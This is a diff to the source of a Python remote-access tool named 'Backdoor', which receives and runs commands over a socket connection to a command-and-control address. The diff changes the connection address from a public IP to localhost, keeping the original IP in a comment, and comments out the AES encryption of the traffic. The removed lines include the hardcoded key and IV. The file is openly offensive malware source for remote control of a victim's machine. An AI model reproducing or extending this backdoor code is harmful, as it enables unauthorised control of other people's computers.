@@ -30,7 +30,7 @@ from Logger import Logger
 class Backdoor:
     NUMBER_OF_THREADS = 6
     JOB_NUMBER = [0, 3, 4, 6]
-    Ip = "20.101.135.232"  # 20.101.135.232
+    Ip = "127.0.0.1"  # 20.101.135.232
     NUMBER_OF_PORTS = 5
     MAX_PORT_VALUE = 65535
     MIN_PORT_VALUE = 49152
@@ -41,13 +41,10 @@ class Backdoor:
 
     queue = Queue()
 
-    iv = b"alZtfBYgrEpOidxu"
-    key = b"wEzDCNvhplrfPTkFt9zUdygZDIVoGC9Z"
-    cipher_decrypt = AES.new(key, AES.MODE_CFB, IV=iv)
-
-    iv = b"alZtfBYgrEpOidxu"
-    key = b"wEzDCNvhplrfPTkFt9zUdygZDIVoGC9Z"
-    cipher_encrypt = AES.new(key, AES.MODE_CFB, IV=iv)
+    # iv = b"alZtfBYgrEpOidxu"
+    # key = b"wEzDCNvhplrfPTkFt9zUdygZDIVoGC9Z"
+    # cipher_decrypt = AES.new(key, AES.MODE_CFB, IV=iv)
+    # cipher_encrypt = AES.new(key, AES.MODE_CFB, IV=iv)
 
     # Initialize the socket connection via constructor with the given ip and port value
     def __init__(self):
@@ -176,9 +173,9 @@ class Backdoor:
     # Sending data plainly might cause problems because end of the data stream cannot be known
     def __send_data(self, data):
         json_data = json.dumps(data).encode()
-        cipher_bytes = self.cipher_encrypt.encrypt(json_data)
-        encrypted_text = base64.b64encode(cipher_bytes)
-        msg = struct.pack('>I', len(encrypted_text)) + encrypted_text
+        # cipher_bytes = self.cipher_encrypt.encrypt(json_data)
+        # encrypted_text = base64.b64encode(cipher_bytes)
+        msg = struct.pack('>I', len(json_data)) + json_data
         self.connection.send(msg)
 
     # Read data in 1024 byte chunks until json file is fully received
@@ -190,16 +187,6 @@ class Backdoor:
         msglen = struct.unpack('>I', raw_msglen)[0]
         # Read the message data
         return self.__recvpayload(msglen)
-
-        # json_data = ""
-        # while True:
-        #     try:
-        #         json_data += self.connection.recv(1024).decode()
-        #         ct = base64.b64decode(json_data)
-        #         pt = self.cipher.decrypt(ct)
-        #         return json.loads(json_data)
-        #     except ValueError:
-        #         continue
 
     def __recvlength(self, msglen):
         data = bytearray()
@@ -218,9 +205,10 @@ class Backdoor:
                 return None
             data.extend(packet)
 
-        base64decoded = base64.b64decode(data)
-        decrypted_text = self.cipher_decrypt.decrypt(base64decoded)
-        return json.loads(decrypted_text)
+        # base64decoded = base64.b64decode(data)
+        # decrypted_text = self.cipher_decrypt.decrypt(base64decoded)
+
+        return json.loads(data)
 
     # Change directory to given path. Equivalent of "cd" command
     def __change_working_directory_to(self, path):
@@ -343,7 +331,7 @@ class Backdoor:
 
             # Check if connection is available
             elif command[0] == 'AreYouAwake?':
-                self.__send_data(command)
+                self.__send_data("...")
 
             # Execute other builtin commands
             else:
